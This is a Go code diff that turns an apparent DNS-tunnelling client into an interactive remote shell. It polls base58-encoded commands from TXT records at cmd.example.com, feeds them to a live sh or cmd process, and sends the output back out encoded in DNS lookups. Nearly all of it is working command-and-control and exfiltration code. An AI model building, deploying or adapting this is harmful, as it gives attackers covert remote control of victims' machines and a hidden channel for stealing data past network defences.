@@ -5,6 +5,7 @@ import (
 	"context"
 	"encoding/binary"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"os/exec"
@@ -26,15 +27,35 @@ func main() {
 			return d.DialContext(ctx, "udp", "127.0.0.1:53")
 		},
 	}
-	commandChan := make(chan string)
-	responseChan := make(chan []byte)
-	go getCommand(r, commandChan)
-	go handleCommands(commandChan, responseChan)
-	returnResponses(r, responseChan)
+	shell := Shell{}
+	shell.Init()
+
+	go shell.FetchStdin(r)
+	shell.Execute()
+	shell.PostStdout(r)
+
 }
 
-//Contact the server and get commands
-func getCommand(r *net.Resolver, c chan string) {
+type Shell struct {
+	stdOut chan []byte
+	stdIn  chan string
+
+	cmdStdoutReader *io.PipeReader
+	cmdStdoutWriter *io.PipeWriter
+
+	cmdStdinReader  *io.PipeReader
+	cmdStdinWriter  *io.PipeWriter
+}
+
+func (s *Shell) Init() {
+	s.stdIn = make(chan string)
+	s.stdOut = make(chan []byte)
+	s.cmdStdoutReader, s.cmdStdoutWriter = io.Pipe()
+	s.cmdStdinReader, s.cmdStdinWriter = io.Pipe()
+}
+
+//Contact the server and get stdin
+func (s *Shell) FetchStdin(r *net.Resolver) {
 	for {
 		//get shell command using dns TXT record
 		data, err := r.LookupTXT(context.Background(), "cmd.example.com")
@@ -42,60 +63,21 @@ func getCommand(r *net.Resolver, c chan string) {
 			log.Fatal(err)
 			return
 		}
-		c <- data[0]
+		if len(data) > 0 && data[0] != "" {
+			fmt.Printf("Received: %v, %d\n", data, len(data))
+			command := string(base58.Decode(data[0]))
+			command += "\n"
+			s.stdIn <- command
+		}
 		time.Sleep(1 * time.Second)
 	}
 }
 
-//Pass command to the responChan after convertion into an executable command
-func handleCommands(commandChan chan string, responseChan chan []byte) {
-	fmt.Println("waiting for commands...")
+//Return the data to the server
+func (s *Shell) PostStdout(r *net.Resolver) {
 	for {
-		TXTResponse := <-commandChan
-		if TXTResponse != "" {
-			fmt.Println("$ " + TXTResponse)
-			var args []string
-			if strings.Contains(TXTResponse, " ") {
-				args = strings.Split(TXTResponse, " ")
-			} else {
-				args = append(args, TXTResponse)
-			}
-
-			cmd := createCommand(args)
-			//Exec command
-			stdout, err := cmd.Output()
-			if err != nil {
-				responseChan <- []byte(err.Error())
-			} else {
-				responseChan <- stdout
-			}
-
-		}
-	}
-}
-
-//Converts the command into an executable command
-func createCommand(args []string) *exec.Cmd {
-	if runtime.GOOS == "windows" {
-		args = append([]string{"cmd", "/C"}, args...)
-	}
-	fmt.Println(args)
-	var cmd *exec.Cmd
-	if len(args) > 1 {
-		cmd = exec.Command(args[0], args[1:]...)
-
-	} else {
-		cmd = exec.Command(args[0])
-	}
-
-	return cmd
-
-}
-
-func returnResponses(r *net.Resolver, responseChan chan []byte) {
-	for {
-		cmdOutput := <-responseChan
-		requests := encodeRequests(cmdOutput)
+		cmdOutput := <-s.stdOut
+		requests := s.encodeRequests(cmdOutput)
 		for i, request := range requests {
 			fmt.Println(i, " ", request)
 			_, err := r.LookupHost(context.Background(), request)
@@ -106,7 +88,54 @@ func returnResponses(r *net.Resolver, responseChan chan []byte) {
 	}
 }
 
-func encodeRequests(cmdOutput []byte) []string {
+//Execute the shell in the backend and start the process
+func (s *Shell) Execute() {
+	s.startShell()
+
+	//Stdin
+	go func() {
+		for {
+			commandInput := <-s.stdIn
+			fmt.Println("Write data to stdin")
+			_, err := s.cmdStdinWriter.Write([]byte(commandInput))
+			if err != nil{
+				fmt.Println(err)
+				return
+			}
+		}
+	}()
+
+	//Stdout
+	stdoutData := make([]byte, 32767)
+	go func() {
+		for {
+			n, err := s.cmdStdoutReader.Read(stdoutData)
+			if err != nil{
+				fmt.Println(err)
+				return
+			}
+			s.stdOut <- stdoutData[:n]
+		}
+	}()
+}
+
+func (s *Shell) startShell() {
+	fmt.Println("Launching bash/cmd process")
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd")
+	}else{
+		cmd = exec.Command("sh","-i")
+	}
+
+	cmd.Stdin = s.cmdStdinReader
+	cmd.Stdout = s.cmdStdoutWriter
+	cmd.Stderr = s.cmdStdoutWriter
+
+	cmd.Start()
+}
+
+func (s *Shell) encodeRequests(cmdOutput []byte) []string {
 	var requests []string
 	var packetNumber uint16 = 0
 	var builder strings.Builder
@@ -126,14 +155,14 @@ func encodeRequests(cmdOutput []byte) []string {
 			buf := new(bytes.Buffer)
 			binary.Write(buf, binary.BigEndian, packetNumber)
 			packetNumber++
-			bytes := buf.Bytes()
-			bytes[0] = bytes[0] & 127
+			data := buf.Bytes()
+			data[0] = data[0] & 127
 			//update the msb if this is the last request
 			if len(cmdOutput)-i < (32*3 - 2) {
-				bytes[0] = bytes[0] | 128
+				data[0] = data[0] | 128
 			}
 
-			levelBytes = append(levelBytes, bytes...)
+			levelBytes = append(levelBytes, data...)
 		}
 		//add the current byte
 		levelBytes = append(levelBytes, cmdOutput[i])
